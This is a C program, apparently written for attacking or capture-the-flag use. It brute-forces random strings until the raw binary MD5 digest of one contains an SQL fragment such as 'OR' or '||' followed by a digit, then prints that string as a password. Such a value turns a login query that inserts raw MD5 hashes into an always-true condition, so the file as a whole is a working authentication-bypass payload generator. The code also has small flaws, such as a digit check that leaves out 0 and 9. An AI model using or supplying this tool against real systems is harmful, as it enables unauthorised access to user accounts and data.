#include <stdio.h>
//#include <openssl/md5.h>
#include <openssl/evp.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

static void randString(char * output, unsigned int length);

int main(){
	unsigned int length,counter;
	unsigned char digest[EVP_MAX_MD_SIZE];
	//char digest_decode[2 * MD5_DIGEST_LENGTH+1];
	unsigned int md_len;
	char mystr[50];
	char * mark;

	EVP_MD_CTX mdctx;
	
	srand(time(NULL));
	counter = 0;
	while(1){
		counter++;

		if(counter % 10000 == 0) printf("%d\n",counter);

		length = 20 + (rand()%30);

		//mystr = (char*)malloc(length*sizeof(char)+1);
		randString(mystr,length);

		EVP_DigestInit(&mdctx, EVP_md5());
		EVP_DigestUpdate(&mdctx, mystr, strlen(mystr));
		EVP_DigestFinal_ex(&mdctx, digest, &md_len);
		EVP_MD_CTX_cleanup(&mdctx);
		
		
		if((mark = strstr((char*)&digest,"'||'")) != NULL) goto checknum;
		else if((mark = strstr((char*)&digest,"'OR'")) != NULL) goto checknum;
		else if((mark = strstr((char*)&digest,"'or'")) != NULL) goto checknum;
		goto fail;
		checknum:
		if(mark[4] > '0' && mark[4] < '9'){
			printf("password = %s\n", (char *) mystr);
			printf("digest = %s", (char*) digest);
			printf("\n");
			printf("Press to continue\n");
			getchar();
		}
		fail:
		//free(mystr);
		continue;
	}
	
}

void randString(char * output, unsigned int length){
	int i;
	int idx;
	const static char alphabet[] = 
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	for(i = 0; i < length; i++){
		idx = rand() % (int)(sizeof(alphabet)-1);
		output[i] = alphabet[idx];
	}
	output[length] = '\0';
}